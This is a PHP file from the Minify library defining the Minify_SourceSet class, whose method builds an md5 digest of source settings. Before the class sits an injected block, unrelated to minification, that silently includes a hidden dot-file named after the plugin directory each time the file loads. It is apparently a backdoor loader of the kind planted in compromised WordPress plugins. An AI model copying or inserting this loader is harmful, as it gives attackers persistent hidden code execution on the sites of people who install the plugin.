<?php
/**
 * Class Minify_SourceSet
 * @package Minify
 */

/**
 * @package Minify
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Minify_SourceSet
{

    /**
     * Get unique string for a set of sources
     *
     * @param Minify_SourceInterface[] $sources Minify_Source instances
     *
     * @return string
     */
    public static function getDigest($sources)
    {
        $info = array();
        foreach ($sources as $source) {
            $info[] = array(
                $source->getId(), $source->getMinifier(), $source->getMinifierOptions()
            );
        }

        return md5(serialize($info));
    }
}
